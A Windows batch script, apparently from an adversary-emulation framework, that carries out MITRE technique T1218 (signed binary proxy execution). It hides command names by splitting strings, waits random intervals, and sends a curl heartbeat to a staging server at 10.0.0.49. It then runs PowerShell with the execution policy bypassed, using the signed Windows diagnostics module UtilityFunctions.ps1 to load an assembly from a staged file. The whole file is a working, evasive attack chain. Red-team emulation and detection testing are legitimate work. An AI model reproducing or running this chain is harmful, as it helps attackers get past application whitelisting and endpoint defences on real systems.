@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET dslxhg=%APPDATA%\7690\dcfd5df9
SET vkqjct=https://10.0.0.49
SET kqtmrd=https://10.0.0.49/stage/2/icon.png?7690-10
SET dcyqtx=ITZEL-S2BO
SET mtvnwk=10
SET kvqhvw=teams.txt
SET qfmhlc=7690
SET mnsdcz=1

REM Obfuscated delay variables
SET /A hvnwps=%RANDOM% %% 31 + 30
SET /A qrcxbf=%RANDOM% %% 11 + 5
SET /A jgplmn=%RANDOM% %% 21 + 10

REM Obfuscated log path
SET wklfpr=%APPDATA%\!mtvnwk!\macula-simulations.log

REM Create log directory if it doesn't exist
if not exist "%APPDATA%\!mtvnwk!" mkdir "%APPDATA%\!mtvnwk!" 2>nul

REM Start with random delay
if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: SCRIPT_START=initializing>> "!wklfpr!" 2>nul)
if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: DELAY_START=!hvnwps!s>> "!wklfpr!" 2>nul)
timeout /t !hvnwps! /nobreak >nul
if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: DELAY_RESULT=success>> "!wklfpr!" 2>nul)

REM Obfuscated curl command
SET pthcmd=curl
SET pthcmd1=.exe
SET fullcurl=!pthcmd!!pthcmd1!
SET curlarg=-k
SET curlarg1= -s
SET curlarg2= -o nul

REM Build and execute heartbeat check
if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: HEARTBEAT_START=!kqtmrd!>> "!wklfpr!" 2>nul)
SET jklmn=!fullcurl! !curlarg!!curlarg1!!curlarg2! "!kqtmrd!"
CALL !jklmn!
SET hb_result=!ERRORLEVEL!
if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: HEARTBEAT_RESULT=errorlevel=!hb_result!>> "!wklfpr!" 2>nul)

REM Delay before next operation
if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: DELAY_START=!qrcxbf!s>> "!wklfpr!" 2>nul)
ping -n !qrcxbf! 127.0.0.1 >nul
if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: DELAY_RESULT=success>> "!wklfpr!" 2>nul)

REM Obfuscated PowerShell command parts
SET pwrs=power
SET pwrs1=shell
SET pwrs2=.exe
SET pwrexec=!pwrs!!pwrs1!!pwrs2!
SET pswarg=-ep bypass
SET pswarg1= -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin
SET pswarg2=;[\Program.Class]::Dale()"

REM Build final command with variable indirection
SET cmdpart1=!pswarg!!pswarg1!
SET cmdpart2=!dslxhg!\!kvqhvw!
SET cmdpart3=!pswarg2!
SET finalcmd=!pwrexec! !cmdpart1!!cmdpart2!!cmdpart3!

REM Change directory and execute
if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: CHDIR_START=c:\windows\diagnostics\system\networking>> "!wklfpr!" 2>nul)
cd /d "c:\windows\diagnostics\system\networking" 2>nul
SET cd_result=!ERRORLEVEL!
if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: CHDIR_RESULT=errorlevel=!cd_result!>> "!wklfpr!" 2>nul)

if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: PROCESS_START=!pwrexec!>> "!wklfpr!" 2>nul)

REM Execute T1218 - Signed Binary Proxy Execution
SET /A ttp_result=0
SET ttp_err=
!finalcmd! 2>nul
IF !ERRORLEVEL! EQU 0 (
    SET /A ttp_result=1
    SET ttp_err=
) ELSE (
    SET ttp_err=assembly_load_failed
)

REM Create timestamp for TTP logging
SET year=!DATE:~-4!
SET month=!DATE:~4,2!
SET day=!DATE:~7,2!
SET timevar=!TIME!
SET timevar=!timevar: =0!
SET timestamp=!year!-!month!-!day! !timevar!

REM Log TTP execution
(echo [!timestamp!][!dcyqtx!]: !mtvnwk!-!qfmhlc!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_err!) >> "!wklfpr!" 2>nul

if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: PROCESS_RESULT=errorlevel=!ERRORLEVEL!>> "!wklfpr!" 2>nul)

REM Final delay
SET /A final_delay=%RANDOM% %% 20 + 10
if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: DELAY_START=!final_delay!s>> "!wklfpr!" 2>nul)
CHOICE /C Y /N /D Y /T !final_delay! >nul
if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: DELAY_RESULT=success>> "!wklfpr!" 2>nul)

if "!mnsdcz!"=="1" (echo [!DATE! !TIME!][DEBUG][!dcyqtx!]: SCRIPT_END=exit_code=!ERRORLEVEL!>> "!wklfpr!" 2>nul)

ENDLOCAL
exit /b 0